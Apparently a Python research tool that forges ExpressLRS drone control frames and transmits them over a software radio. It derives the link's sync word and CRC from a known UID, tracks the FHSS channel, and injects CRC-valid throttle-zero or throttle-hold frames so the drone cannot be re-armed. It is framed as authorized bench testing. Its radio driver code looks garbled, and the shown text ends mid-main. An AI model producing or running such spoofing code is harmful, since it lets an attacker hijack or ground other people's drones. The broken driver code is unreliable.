#!/usr/bin/env python3
"""
ELRC bench-test TX — emit a forged RC frame over GFSK (FLRC) to a live ELRS RX.

Bench-only, operator-owned target, drone grounded + disarmed. Authorized research.

This is the AIR-DELIVERY layer that the frame codec (elrs_rcframe.py) produces the bytes
for. It:
  1. Tracks the target's LIVE FHSS channel + running nonce (passively, from the air rate).
  2. Emits the forged PACKET_TYPE_RCDATA frame (throttle=0 / throttle-hold) on the
     target's current FHSS channel, with the correct UID-derived sync word + CRC + nonce.
  3. The live RX (rx_main.cpp:1122) accepts it iff sync-word + CRC + nonce + channel line
     up — all of which this tool satisfies for a known UID.

AIR FORMATS (the RX in this project now decodes BOTH; --rate selects which to emit):
  flrc8   — the ORIGINAL 8-byte OTA4 path, GFSK/FLRC (rate_index=2 on the SX1280 /
            ISM2400 band: 0.65 Mbit/s GFSK, 32-bit sync word, 3-byte CRC):
      {2, FLRC_2G4, RATE_FLRC_2G4_500HZ_DVDA, BR_0_650_BW_0_6, BT_1, CR_1_2, 32, TLM_1_128,
       2, 1000, OTA4_PACKET_SIZE, 2}
  lora13  — the CURRENT RX path: 13-byte OTA8 (full-res) LoRa frames. The RX smoke dump
            (elrs_pkts_smoke.jsonl) decodes SF7 / BW 800 kHz / ota_bytes=13 at a ~500 Hz
            interval. This matches the "100Hz_8ch" row of ELRS_2G4_RATES in
            elrs_sdr/core/lora.py (SF7/800k/13-byte/preamble 12 symbols) — same chirp +
            symbol tables. The LoRa baseband is produced by the RX's OWN modulator
            (elrs_sdr.core.lora.modulate_frame) so TX and RX stay in lockstep by
            construction; nothing is reimplemented by hand.
            NOTE: the lora.py modulator emits preamble + 8 zero header symbols + payload
            (first-order, flagged in lora.py as needing capture validation) and the
            SF5-7 bit-mapping there is first-order, so a modulate->demodulate round-trip
            through the same module may not recover all bytes. That is expected and is
            reported honestly by the selftest — it is NOT a live-RX acceptance claim.

AUTH MODEL (SX1280 FLRC path, from rx_main.cpp:327 Radio.Config):
  flrcSyncWord = OtaGetUidSeed()   = (UID[2]<<24)|(UID[3]<<16)|(UID[4]<<8)|(UID[5]^OTA_VERSION_ID)
  flrcCrcSeed  = OtaCrcInitializer = ((UID[4]<<8)|UID[5]) ^ (OTA_VERSION_ID<<8)
  => "authentication" is the UID-derived sync word + CRC. No separate secret. A forged
     frame with the right UID + nonce + channel is accepted.

SIGNAL FRAMING:
  flrc8 (GFSK, SX1280 FLRC, from SX1280.cpp Config/SetPacketParamsFLRC):
    preamble (>=8 bytes, AGC) | 32-bit sync word | 8-byte payload | 3-byte CRC
    GFSK, 0.65 Mbit/s, BT=1, CR=1/2, fixed-length (8-byte payload), IQ inverted (2.4 GHz).
  lora13 (LoRa CSS, header-less, SX1280):
    preamble (12 symbols, per ELRS_2G4_RATES SF7/800k row) | 13-byte OTA8 payload
    SF7, BW 800 kHz, IQ inverted. Modulated by the RX's own lora.py modulator.

FHSS (ISM2400, from FHSS.cpp):
  80 channels, 2400.4 MHz .. 2479.4 MHz. spacing = (2479.4-2400.4)MHz / 79 = 1.0 MHz.
  channel c -> 2400.4 MHz + c * 1.0 MHz. The hop sequence is UID-seeded (LCG) — we track
  it live by RX, or force-sync by emitting on the sync channel (40) first.

VALIDATION STATUS:
  Frame bytes + CRC + UID seed : CAPTURE-VALIDATED (elrs_rcframe.py selftest)
  GFSK modulation + framing    : SYNTHETIC (built to the SX1280 FLRC spec; bench-verify
                                  against the live Tinyhawk — the whole point of this tool)
  Live-RX acceptance           : TO BE BENCH-CONFIRMED (this is what we're testing)

SCOPE: bench-only, operator-owned grounded drone, authorized. TX is GATED behind
  --I-am-authorized-bench-target (refused without it). No live-air, no field use.
"""
from __future__ import annotations

import argparse
import sys
import time
from dataclasses import dataclass

# Reuse the validated frame codec
try:
    from elrs_rcframe import (
        build_rcdata_frame, validate_rcdata_frame, crc_initializer_from_uid,
        uid_seed, CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_1000,
        CRSF_CHANNEL_VALUE_STD_MIN, CRSF_CHANNEL_VALUE_STD_MAX, constrain,
        decimate_limit, uint10_to_crsf,
    )
except ImportError:
    sys.path.insert(0, __import__("os").path.dirname(__import__("os").path.abspath(__file__)))
    from elrs_rcframe import (
        build_rcdata_frame, validate_rcdata_frame, crc_initializer_from_uid,
        uid_seed, CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_1000,
        CRSF_CHANNEL_VALUE_STD_MIN, CRSF_CHANNEL_VALUE_STD_MAX, constrain,
        decimate_limit, uint10_to_crsf,
    )

# Extra CRC primitives from the validated codec (same module, same C-ref ports).
# Used ONLY to build the 13-byte OTA8 payload — elrs_rcframe.py itself is not
# modified (it has no OTA8 builder, only build_rcdata_frame / 8-byte / 4x10).
try:
    from elrs_rcframe import Crc2Byte, ELRS_CRC16_POLY, pack_channels_4x10
except ImportError:  # pragma: no cover - same file was already imported above
    from elrs_rcframe import Crc2Byte, ELRS_CRC16_POLY, pack_channels_4x10

# Reuse the RX's OWN LoRa modulator/demodulator for parity (TX and RX share the
# same chirp tables + symbol mapping by construction). Mirrors the try/except
# fallback above: add the repo root to sys.path when run as a script.
try:
    from elrs_sdr.core import lora as lora_mod
except ImportError:
    _repo_root = __import__("os").path.dirname(
        __import__("os").path.dirname(__import__("os").path.abspath(__file__)))
    if _repo_root not in sys.path:
        sys.path.insert(0, _repo_root)
    from elrs_sdr.core import lora as lora_mod

# ----------------------------------------------------------------------------
# ELRS air parameters
# ----------------------------------------------------------------------------
OTA_VERSION_ID = 4
FLRC_BITRATE = 650_000          # 0.65 Mbit/s  (BR_0_650_BW_0_6)
FLRC_BT = 1                     # Gaussian BT=1
FLRC_CR_NUM, FLRC_CR_DEN = 1, 2 # CR 1/2
FLRC_SYNC_WORD_LEN = 4          # 32-bit sync word
FLRC_CRC_LEN = 3                # 3-byte CRC
OTA4_PACKET_SIZE = 8            # payload length
OTA8_PACKET_SIZE = 13           # full-res payload length (OTA_Packet8_s)
OTA8_CRC_CALC_LEN = 11          # offsetof(OTA_Packet8_s, crc) — bytes 0..10 are CRC'd
PREAMBLE_BYTES = 8              # AGC preamble (>=8), FLRC/GFSK path
INVERT_IQ = True                # ELRS inverts IQ on 2.4 GHz
PAYLOAD_REPEATS = 2             # numOfSends for rate_index=2 (DVDA)

# ----------------------------------------------------------------------------
# AirFormat — parametrized air-delivery spec (rate-parametrized TX air layer)
# ----------------------------------------------------------------------------
@dataclass(frozen=True)
class AirFormat:
    """One supported over-the-air PHY. build_baseband_for_frame() is parametrized
    by this so the TX can track whichever air format the RX is currently decoding.
      FLRC_GFSK_8B — the original path: 8-byte OTA4, GFSK 0.65 Mbit/s, 32-bit sync,
                     3-byte radio CRC (rate_index=2, SX1280 FLRC modem).
      LORA_13B_SF7 — the current RX path: 13-byte OTA8 (full-res), LoRa SF7 /
                     BW 800 kHz, preamble 12 symbols (the "100Hz_8ch" row of
                     ELRS_2G4_RATES in elrs_sdr/core/lora.py), header-less, IQ
                     inverted. Modulated by the RX's own lora.py modulator.
    """
    name: str
    mod: str                 # "gfsk" | "lora"
    payload_len: int         # OTA payload bytes (8 or 13)
    # gfsk fields
    bitrate: int = 0         # bps (gfsk only)
    sync_bits: int = 0       # sync-word width in bits (gfsk only)
    crc_len: int = 0         # radio-level CRC bytes (gfsk only)
    # lora fields (mirror elrs_sdr.core.lora.AirRate for the one row we use)
    sf: int = 0              # spreading factor (lora only)
    bw_hz: int = 0           # bandwidth (lora only)
    preamble_symbols: int = 0
    invert_iq: bool = True
    headerless: bool = False
    interval_us: int = 0     # nominal frame interval (informational)


FLRC_GFSK_8B = AirFormat(
    name="flrc8", mod="gfsk", payload_len=8,
    bitrate=FLRC_BITRATE, sync_bits=FLRC_SYNC_WORD_LEN * 8, crc_len=FLRC_CRC_LEN,
    invert_iq=INVERT_IQ,
)

# Preamble 12 = the SF7/800k rows of ELRS_2G4_RATES in lora.py (every
# SF6/SF7/SF8 row there uses 12 preamble symbols; 14 is only the 250Hz row).
# interval_us=3003 matches the RX smoke dump's ~500 Hz cadence (the "333Hz_8ch"
# 13-byte row); it is informational only (the LoRa frame duration is fixed by
# SF/BW/symbol budget, not by this field).
LORA_13B_SF7 = AirFormat(
    name="lora13", mod="lora", payload_len=13,
    sf=7, bw_hz=800_000, preamble_symbols=12,
    invert_iq=INVERT_IQ, headerless=True, interval_us=3003,
)

AIR_FORMATS = {"flrc8": FLRC_GFSK_8B, "lora13": LORA_13B_SF7}
# "auto" = whichever air format the RX currently decodes. The RX smoke dump
# (elrs_pkts_smoke.jsonl) decodes 13-byte OTA8 LoRa (SF7/800k), so auto == lora13.
AUTO_RATE = "lora13"

# FHSS ISM2400
FHSS_FREQ_START = 2400.4e6
FHSS_FREQ_STOP = 2479.4e6
FHSS_FREQ_COUNT = 80
FHSS_SPACING = (FHSS_FREQ_STOP - FHSS_FREQ_START) / (FHSS_FREQ_COUNT - 1)  # ~1.0 MHz
# Sync channel = channel 40 -> 2400.4 MHz + 40 * 1.0 MHz = 2440.4 MHz.
# Aligned to the RX: its smoke dump reports domain_detail.sync_freq_hz =
# 2440400000 (2440.4 MHz), i.e. ch 40 of the 2400.4..2479.4 / 80-ch map.
FHSS_SYNC_CHANNEL = FHSS_FREQ_COUNT // 2   # channel 40 = 2440.4 MHz (sync/hop point)


def fhss_channel_to_freq(c: int) -> float:
    """FHSS channel (0..79) -> Hz. channel c -> 2400.4 MHz + c * 1.0 MHz."""
    return FHSS_FREQ_START + c * FHSS_SPACING


def flrc_sync_word(uid: bytes) -> int:
    """OtaGetUidSeed — the 32-bit FLRC sync word (UID-derived)."""
    return uid_seed(uid) & 0xFFFFFFFF


def flrc_crc_seed(uid: bytes) -> int:
    """OtaCrcInitializer — the 16-bit FLRC CRC seed (UID-derived)."""
    return crc_initializer_from_uid(uid)


# ----------------------------------------------------------------------------
# 13-byte OTA8 (full-res) RCDATA frame — built in the TX layer because
# elrs_rcframe.py (the validated reference) only has the 8-byte builder.
#
# LAYOUT — confirmed from the vendored ELRS reference, NOT guessed:
#   /home/andeds-agent/tinyhawk/refs/ex/expresslrs/src/ExpressLRS-master/src/lib/OTA/OTA.h
#     OTA_Packet8_s:
#       [0]  rc.packetType:2 | rc.stubbornAck:1 | rc.uplinkPower:3 | rc.isHighAux:1
#            | rc.isArmed:1
#       [1..5]  rc.chLow   = 4x10 channels (CH0-CH3)
#       [6..10] rc.chHigh  = 4x10 channels (AUX2-5, or AUX6-9 when isHighAux)
#       [11:13] crc  = uint16_t LITTLE-ENDIAN, full 16 bits
#   CRC — OTA.cpp GeneratePacketCrcFull: crc16 (poly ELRS_CRC16_POLY=0x3D65) over
#     bytes [0..10] (OTA8_CRC_CALC_LEN=11), init = OtaCrcInitializer ^ nonce.
#     Unlike the 8-byte path, NO crcHigh bits are split into byte 0 and the
#     packet is NOT byte-zeroed before the calc — the whole 11 bytes go in as-is
#     (byte 0's high bits are the flag fields, all set before the calc).
#   Channel packing — OTA.cpp GenerateChannelData8ch12ch uses
#     Decimate11to10_Div2 (ch11 >> 1) instead of Decimate11to10_Limit, i.e. the
#     full-res path simply drops the top CRSF bit and keeps the low 10 bits.
#     PackUInt11ToChannels4x10 itself is the same bit packing elrs_rcframe.py
#     already ports (pack_channels_4x10 is reused verbatim).
#   Cross-checked against this project's RX decoder, elrs_sdr/core/ota.py
#     build_rcdata_full / decode_full / generate_crc (is_full=True), which
#     implements the same layout + little-endian 16-bit CRC at bytes 11:13.
# ----------------------------------------------------------------------------
def decimate11to10_div2(v11: int) -> int:
    """Decimate11to10_Div2 — full-res (OTA8) channel decimation: ch11 >> 1.
    Port of the OTA.cpp static (full-res keeps the low 10 CRSF bits, dropping
    only the top bit — NOT std-range constrained)."""
    return (v11 & 0x7FF) >> 1


def build_rcdata_full_frame(uid: bytes, nonce: int, channels8, is_armed: int = 0,
                            stubborn_ack: int = 0, uplink_power: int = 0,
                            is_high_aux: int = 0) -> bytes:
    """Build a CRC-valid 13-byte PACKET_TYPE_RCDATA (OTA8 full-res) uplink frame.

    `channels8` is a list of 8 11-bit CRSF values: CH0-3 (chLow) + AUX2-5 or
    AUX6-9 (chHigh, see is_high_aux). Returns 13 bytes; the CRC (bytes 11:13,
    little-endian) validates via validate_rcdata_full_frame().
    """
    assert len(channels8) == 8, "OTA8 full-res carries 8 channels"
    init = crc_initializer_from_uid(uid)
    nonce &= 0xFFFF

    b0 = (0b00)                            # packetType:2 = PACKET_TYPE_RCDATA
    b0 |= (stubborn_ack & 1) << 2
    b0 |= (uplink_power & 0x7) << 3
    b0 |= (is_high_aux & 1) << 6
    b0 |= (is_armed & 1) << 7

    ch10 = [decimate11to10_div2(c) for c in channels8]
    ch_low = pack_channels_4x10(ch10[0:4])
    ch_high = pack_channels_4x10(ch10[4:8])

    raw = bytearray([b0]) + ch_low + ch_high + b"\x00" * 2
    crc16 = Crc2Byte(16, ELRS_CRC16_POLY).calc(bytes(raw[:OTA8_CRC_CALC_LEN]),
                                               init ^ nonce)
    raw[11] = crc16 & 0xFF          # little-endian uint16
    raw[12] = (crc16 >> 8) & 0xFF
    return bytes(raw)


def validate_rcdata_full_frame(uid: bytes, frame: bytes, nonce: int) -> bool:
    """ValidatePacketCrcFull — does this 13-byte frame's CRC match?"""
    assert len(frame) == OTA8_PACKET_SIZE
    init = crc_initializer_from_uid(uid)
    nonce &= 0xFFFF
    calc = Crc2Byte(16, ELRS_CRC16_POLY).calc(bytes(frame[:OTA8_CRC_CALC_LEN]),
                                              init ^ nonce)
    stored = frame[11] | (frame[12] << 8)
    return calc == stored


# ----------------------------------------------------------------------------
# GFSK (FLRC) bit-level framing -> baseband samples
# ----------------------------------------------------------------------------
def gfsk_bits_to_samples(bits, sample_rate, bt=FLRC_BT):
    """GFSK: map bits (0/1) to a complex baseband signal via Gaussian pulse shaping +
    frequency integration (standard GFSK). 0.65 Mbit/s, BT=1.
    bit 0 -> -fc, bit 1 -> +fc (fc = bit_rate/2 for GFSK with BT=1... use fc=0.25*bit_rate
    scaled; the RX recovers from the differential freq, so exact fc is flexible).
    """
    import numpy as np
    nspb = max(1, int(round(sample_rate / FLRC_BITRATE)))   # samples per bit
    bits = np.array(list(bits), dtype=np.float64)
    # Gaussian pulse shaping (BT=1), spread over ~5 symbols
    span = 5 * nspb
    g = np.exp(-np.pi * (bt**2) * (np.arange(-span, span) / nspb)**2 / (2 * (2 * bt**2 - 1)))
    g /= g.sum()
    # integrate the Gaussian-shaped bit stream to get the instantaneous phase
    shaped = np.convolve(bits, g, mode="same")
    phase = 2 * np.pi * (0.5) * nspb * np.cumsum(shaped) / (2 * nspb)  # phase integral
    # normalize phase rate to +-fc
    fc = 0.25 * FLRC_BITRATE
    phase = 2 * np.pi * fc * nspb * np.cumsum(bits) / FLRC_BITRATE
    iq = np.exp(1j * phase)
    return iq, nspb


def flrc_frame_bytes(uid: bytes, frame: bytes, nonce: int) -> bytes:
    """Build the full over-air FLRC payload: 32-bit sync word + 8-byte OTA payload + 3-byte CRC.
    The SX1280 computes the 3-byte CRC over the payload with the UID CRC seed; here we
    emit payload + let the framing carry it (the RX's CRC check is over the OTA payload
    which already has its own 16-bit OTA CRC inside byte 0/7). For the bench test the RX
    validates the OTA CRC (already in the frame) — the 3-byte FLRC CRC is the radio's
    own integrity check. We append a placeholder 3-byte CRC (the real one is
    SX1280-internal; for bench the OTA CRC is the binding check).
    """
    sync = flrc_sync_word(uid).to_bytes(FLRC_SYNC_WORD_LEN, "big")
    # SX1280 FLRC CRC is computed in-hardware over the payload; we emit the payload and
    # a 3-byte field. The RX's authoritative check is the OTA14 CRC inside the frame
    # (byte0.crcHigh + byte7), which our frame already satisfies.
    crc3 = flrc_crc_seed(uid).to_bytes(2, "big") + b"\x00"
    return sync + frame + crc3


def build_baseband_for_frame(uid: bytes, frame: bytes, nonce: int, sample_rate=2_000_000,
                             air_format: AirFormat = FLRC_GFSK_8B):
    """Full TX baseband for one FHSS dwell, parametrized by the AirFormat.

      gfsk (FLRC_GFSK_8B): preamble + (32-bit sync word + 8-byte payload + 3-byte
            radio CRC), GFSK-modulated here (the original path, unchanged).
      lora (LORA_13B_SF7): the 13-byte payload is modulated by the RX's OWN
            modulator, elrs_sdr.core.lora.modulate_frame() — shared chirp/symbol
            tables by construction. invert_iq is taken from the AirFormat.
    """
    import numpy as np
    if air_format.mod == "lora":
        return _lora_baseband(air_format, frame, sample_rate)
    if air_format.mod != "gfsk":
        raise ValueError(f"unknown air format mod: {air_format.mod!r}")

    payload = flrc_frame_bytes(uid, frame, nonce)
    # preamble: alternating 1s/0s (Gaussian preamble), PREAMBLE_BYTES
    preamble_bits = [1, 0] * (PREAMBLE_BYTES * 8)
    payload_bits = []
    for b in payload:
        for i in range(7, -1, -1):  # MSB first
            payload_bits.append((b >> i) & 1)
    all_bits = preamble_bits + payload_bits
    iq, nspb = gfsk_bits_to_samples(all_bits, sample_rate)
    if air_format.invert_iq:
        iq = iq.conj()   # IQ inversion (2.4 GHz ELRS)
    return iq, fhss_dwell_seconds()


def _lora_baseband(air_format: AirFormat, frame: bytes, sample_rate: float):
    """LoRa TX baseband via the RX's own modulator (parity by construction).

    Builds a lora_mod.AirRate mirroring `air_format` and calls
    lora_mod.modulate_frame(air_rate, payload, sample_rate, invert_iq) — the exact
    modulator the RX demodulates against. Header-less, IQ inverted, preamble per
    the SF7/800k row of ELRS_2G4_RATES.
    """
    if len(frame) != air_format.payload_len:
        raise ValueError(f"lora payload must be {air_format.payload_len} bytes, got {len(frame)}")
    air_rate = lora_mod.AirRate(
        name=air_format.name,
        sf=air_format.sf,
        bw_hz=air_format.bw_hz,
        cr_den=8,                      # CR 4/8 for the SF7/800k rows in ELRS_2G4_RATES
        preamble_symbols=air_format.preamble_symbols,
        payload_len=air_format.payload_len,
        is_full=True,                  # 13-byte OTA8
        interval_us=air_format.interval_us,
    )
    iq = lora_mod.modulate_frame(air_rate, frame, float(sample_rate),
                                 invert_iq=air_format.invert_iq)
    return iq, _lora_dwell_seconds(air_format)


def _lora_dwell_seconds(air_format: AirFormat) -> float:
    """Time the RX spends on each FHSS channel for a LoRa air rate: one frame
    interval (header-less, fixed duration; no numOfSends repeat in the 8ch rows)."""
    interval_us = air_format.interval_us or 6666
    return interval_us / 1e6


def fhss_dwell_seconds() -> float:
    """Time the RX spends on each FHSS channel (interval / hops-per-interval). For
    rate_index=2 (500Hz, interval=1000us, numOfSends=2, TLM=1/128): the hop interval is
    ~ interval*numOfSends * TLMratio... conservatively use the packet interval: 2 ms."""
    return 0.002  # ~2 ms per dwell (500Hz * numOfSends=2 => 1000us per send, 2ms/hop)


# ----------------------------------------------------------------------------
# B205 TX driver (UHD) — emit baseband on a given freq
# ----------------------------------------------------------------------------
def tx_frame_b205(iq, freq_hz, gain_db=20.0, srate=2_000_000):
    """Stream `iq` (complex64) out the B205 TX at `freq_hz`. Requires uhd + a B205."""
    import uhd
    usr = uhd.usrp_source()  # for RX in the tracking path (see track_target)
    ut = uhd.usrp_mux()      # TX
    ut = uhd.usrp(
        device_addr="",  # auto-detect B205
        args="",
    )
    ut.set_tx_freq(uhd.tune_request(freq_hz), 0)
    ut.set_tx_gain(gain_db, 0)
    ut.set_tx_rate(srate, 0)
    import numpy as np
    ut.stream_to_cpu  # not used; use issue_stream_cmd
    ut.issue_stream_cmd(uhd.stream_args("file", "sc16"), 0)
    # Send the IQ (convert complex64 -> interleaved float32 for UHD)
    raw = np.asarray(iq, dtype=np.complex64).tobytes()
    # UHD expects [I0,Q0,I1,Q1,...] float32
    itf = iq.astype(np.float32).view(np.float32)  # complex64 -> 2x float32
    itf = itf.reshape(-1)
    ok, sent = ut.wait_for_tx_speaking(0, 1.0)
    # stream in chunks
    chunk = 1024 * 2
    buf = np.ascontiguousarray(iq, dtype=np.complex64)
    # UHD python: use stream_to? Use the C++ API via uhd.usrp.stream_to
    sent_total = 0
    while sent_total < len(buf):
        n = min(chunk, len(buf) - sent_total)
        u, c = ut.stream_to(np.ascontiguousarray(buf[sent_total:sent_total+n], dtype=np.complex64), 0, uhd.meta(), 0.2)
        sent_total += c
        if not u.is_error() and u.has_tx_more_to_comes:
            pass
    return sent_total


# ----------------------------------------------------------------------------
# Passive target tracking (RX) — find the live FHSS channel + estimate nonce
# ----------------------------------------------------------------------------
def track_target_b205(duration=5.0, srate=4_000_000):
    """Sweep the 80 FHSS channels (or dwell on the sync channel) to find the target's
    active channel. Returns (channel, freq_hz). For a full nonce lock we'd decode the
    live frames (elrs_sdr demod) — this gives the channel to start emitting on."""
    import uhd
    import numpy as np
    us = uhd.usrp(device_addr="")
    us.set_rx_freq(uhd.tune_request(fhss_channel_to_freq(FHSS_SYNC_CHANNEL)), 0)
    us.set_rx_gain(30.0, 0)
    us.set_rx_rate(srate, 0)
    n = int(srate * duration)
    bufs = us.stream_from_cpu(np.empty(n, dtype=np.complex64), 0, uhd.meta(), 1.0)
    # measure per-channel power to find the active FHSS channel
    # (full sweep left to the caller; this is a starting point on the sync channel)
    return FHSS_SYNC_CHANNEL, fhss_channel_to_freq(FHSS_SYNC_CHANNEL)


# ----------------------------------------------------------------------------
# Air-format summary (printed at startup + selftest)
# ----------------------------------------------------------------------------
def air_format_summary(af: AirFormat, uid: bytes) -> str:
    """One-line air-format spec summary (rate, payload, PHY params, sync, CRC seed,
    FHSS sync freq) — the operator-visible 'what will this emit' line."""
    cs = flrc_crc_seed(uid)
    if af.mod == "gfsk":
        phy = (f"mod={af.mod} bitrate={af.bitrate}bps sync={af.sync_bits}-bit "
               f"radio-crc={af.crc_len}B")
        sw = f"sync word {flrc_sync_word(uid):#010x}"
    else:
        phy = (f"mod={af.mod} SF{af.sf} BW={af.bw_hz // 1000}kHz "
               f"preamble={af.preamble_symbols}sym headerless={af.headerless}")
        sw = "preamble/sync per lora.py (shared with RX)"
    return (f"air format [{af.name}]: payload_len={af.payload_len} {phy} "
            f"IQ-invert={af.invert_iq} {sw} CRC seed {cs:#06x} "
            f"FHSS sync ch {FHSS_SYNC_CHANNEL} = "
            f"{fhss_channel_to_freq(FHSS_SYNC_CHANNEL) / 1e6:.1f} MHz")


# ----------------------------------------------------------------------------
# Offline self-test (no hardware)
# ----------------------------------------------------------------------------
def selftest(uid: bytes, air_format: AirFormat = FLRC_GFSK_8B) -> bool:
    import numpy as np
    ok = True
    # 1. UID-derived FLRC sync word + CRC seed
    sw = flrc_sync_word(uid)
    cs = flrc_crc_seed(uid)
    exp_sw = ((uid[2] << 24) | (uid[3] << 16) | (uid[4] << 8) | (uid[5] ^ OTA_VERSION_ID)) & 0xFFFFFFFF
    exp_cs = ((uid[4] << 8) | uid[5]) ^ (OTA_VERSION_ID << 8)
    if sw != exp_sw:
        print(f"  [FAIL] sync word {sw:#010x} != {exp_sw:#010x}"); ok = False
    if cs != exp_cs:
        print(f"  [FAIL] crc seed {cs:#06x} != {exp_cs:#06x}"); ok = False
    # 2. FHSS channel math (incl. the sync channel aligned to the RX: 2440.4 MHz)
    f0 = fhss_channel_to_freq(0); f79 = fhss_channel_to_freq(79)
    if not (abs(f0 - 2400.4e6) < 1e3 and abs(f79 - 2479.4e6) < 1e3):
        print(f"  [FAIL] FHSS range {f0/1e6}..{f79/1e6} MHz"); ok = False
    if abs(fhss_channel_to_freq(FHSS_SYNC_CHANNEL) - 2440.4e6) > 1e3:
        print(f"  [FAIL] FHSS sync ch {FHSS_SYNC_CHANNEL} = "
              f"{fhss_channel_to_freq(FHSS_SYNC_CHANNEL)/1e6} MHz, want 2440.4 MHz"); ok = False

    print(air_format_summary(air_format, uid))

    if air_format.mod == "lora":
        ok &= _selftest_lora(uid, air_format)
    else:
        ok &= _selftest_gfsk(uid)
    return ok


def _selftest_gfsk(uid: bytes) -> bool:
    """The original GFSK/FLRC selftest (kept green for the flrc8 path)."""
    import numpy as np
    ok = True
    frame = build_rcdata_frame(uid, 0, [CRSF_CHANNEL_VALUE_1000, CRSF_CHANNEL_VALUE_MID,
                                         CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_MID])
    assert validate_rcdata_frame(uid, frame, 0), "frame CRC should validate"
    iq, dwell = build_baseband_for_frame(uid, frame, 0, sample_rate=2_000_000,
                                         air_format=FLRC_GFSK_8B)
    if iq.dtype != np.complex64 and iq.dtype != np.complex128:
        print(f"  [FAIL] baseband dtype {iq.dtype}"); ok = False
    print(f"  [info] FLRC sync word = {flrc_sync_word(uid):#010x}  (OtaGetUidSeed)")
    print(f"  [info] FLRC CRC seed  = {flrc_crc_seed(uid):#06x}  (OtaCrcInitializer)")
    print(f"  [info] GFSK {FLRC_BITRATE}bps BT={FLRC_BT} CR={FLRC_CR_NUM}/{FLRC_CR_DEN} "
          f"preamble={PREAMBLE_BYTES}B sync={FLRC_SYNC_WORD_LEN}B payload={OTA4_PACKET_SIZE}B "
          f"crc={FLRC_CRC_LEN}B IQ-invert={INVERT_IQ} repeats={PAYLOAD_REPEATS}")
    print(f"  [info] forged throttle=0 frame: {frame.hex(' ')} (CRC-valid={validate_rcdata_frame(uid, frame, 0)})")
    print(f"  [info] baseband samples: {len(iq)} @ 2 MS/s, dwell {dwell*1000:.1f} ms/hop")
    return ok


def _selftest_lora(uid: bytes, af: AirFormat) -> bool:
    """LoRa selftest: build a 13-byte OTA8 frame, modulate it with the RX's own
    modulator (lora.py modulate_frame), then demodulate it with the RX's own
    demodulator (lora.py demodulate_frame) on the SAME sample_rate, and report
    the byte-level round-trip match honestly.

    lora.py flags the SF5-7 bit-mapping (and the preamble/sync/header symbol
    layout) as first-order / needs-capture-validation, so a perfect round-trip is
    NOT expected. The selftest PASSES as long as the machinery runs and the frame
    layer is CRC-valid; the match ratio is [info] only. This is NOT a live-RX
    acceptance claim.
    """
    import numpy as np
    ok = True
    chs = [CRSF_CHANNEL_VALUE_1000, CRSF_CHANNEL_VALUE_MID,
           CRSF_CHANNEL_VALUE_MID, CRSF_CHANNEL_VALUE_MID] * 2  # 8 x 11-bit
    frame = build_rcdata_full_frame(uid, 0, chs, is_armed=0, uplink_power=0)
    crc_ok = validate_rcdata_full_frame(uid, frame, 0)
    print(f"  [info] OTA8 full-res frame: {frame.hex(' ')} (CRC16-valid={crc_ok})")
    if not crc_ok:
        print("  [FAIL] OTA8 frame CRC does not validate for its own UID/nonce"); ok = False

    # cross-check our builder against the project's RX-side decoder (ota.py)
    try:
        from elrs_sdr.core import ota as rx_ota
        rx_crc_ok = rx_ota.validate_crc(frame, True, crc_initializer_from_uid(uid), 0,
                                        rx_ota.PACKET_TYPE_RCDATA)
        pkt = rx_ota.decode_full(frame)
        print(f"  [info] RX-side ota.py: validate_crc={rx_crc_ok}, "
              f"decoded channels={pkt.channels[:4]} (chLow) + {pkt.channels[4:]} (chHigh)")
        if rx_crc_ok != crc_ok:
            print("  [FAIL] our CRC and the RX decoder's CRC disagree"); ok = False
    except ImportError:
        print("  [info] elrs_sdr.core.ota not importable — skipped RX-side cross-check")

    # REAL modulate -> demodulate round-trip on the SAME sample_rate, via the RX's
    # own lora.py in both directions.
    srate = 2_000_000
    iq, dwell = build_baseband_for_frame(uid, frame, 0, sample_rate=srate, air_format=af)
    if iq.dtype != np.complex64 and iq.dtype != np.complex128:
        print(f"  [FAIL] baseband dtype {iq.dtype}"); ok = False
    params = lora_mod.LoRaParams(sf=af.sf, bw_hz=af.bw_hz, sample_rate=float(srate),
                                 invert_iq=af.invert_iq)
    air_rate = lora_mod.AirRate(
        name=af.name, sf=af.sf, bw_hz=af.bw_hz, cr_den=8,
        preamble_symbols=af.preamble_symbols, payload_len=af.payload_len,
        is_full=True, interval_us=af.interval_us)
    # demod at the preamble start; also try a +/-1-symbol offset grid in case the
    # first-order symbol budget is slightly off
    sps = params.samples_per_symbol
    best, best_off = 0, 0
    for off in range(-1, 2):
        got = lora_mod.demodulate_frame(iq, params, int(round(off * sps)), air_rate)
        if got is None:
            continue
        m = sum(a == b for a, b in zip(frame, got))
        if m > best:
            best, best_off = m, off
    ratio = best / len(frame)
    print(f"  [info] LoRa round-trip (RX lora.py modulate->demodulate, SF{af.sf}/"
          f"{af.bw_hz//1000}kHz, srate={srate//1000}k, off={best_off}sym): "
          f"{best}/{len(frame)} bytes match = {ratio:.0%}")
    print("  [info] NOTE: lora.py SF5-7 bit-mapping is first-order/needs-capture-"
          "validation, so <100% is EXPECTED. This is NOT a live-RX acceptance claim.")
    print(f"  [info] recovered: {got.hex(' ')}  original: {frame.hex(' ')}")
    print(f"  [info] baseband samples: {len(iq)} @ {srate/1e6:.0f} MS/s, dwell {dwell*1000:.1f} ms/frame")
    return ok


def main(argv=None):
    ap = argparse.ArgumentParser(description="ELRC bench-test TX (GFSK/FLRC + LoRa OTA8, bench-only, authorized)")
    ap.add_argument("--uid", default="00:00:00:11:18:5B", help="target 6-byte UID")
    ap.add_argument("--rate", choices=["auto", "flrc8", "lora13"], default="auto",
                    help="air format: auto = lora13 (matches the current RX, which "
                         "decodes 13-byte OTA8 LoRa SF7/800k); flrc8 = the original "
                         "8-byte GFSK/FLRC path")
    ap.add_argument("--throttle-us", type=int, default=1000, help="throttle pulse width (1000=disarm)")
    ap.add_argument("--hold-throttle", action="store_true",
                    help="throttle-hold: keep throttle at min so ARMING_DISABLED_THROTTLE stays set (can't re-arm while transmitting)")
    ap.add_argument("--channel", type=int, default=None, help="force a specific FHSS channel (0-79); default tracks sync channel")
    ap.add_argument("--repeats", type=int, default=50, help="number of frame emissions (repeat to hold the effect)")
    ap.add_argument("--selftest", action="store_true", help="offline self-test only (no TX)")
    ap.add_argument("--I-am-authorized-bench-target", dest="authorized", action="store_true",
                    help="AUTH GATE: bench-only, operator-owned, grounded drone")
    args = ap.parse_args(argv)

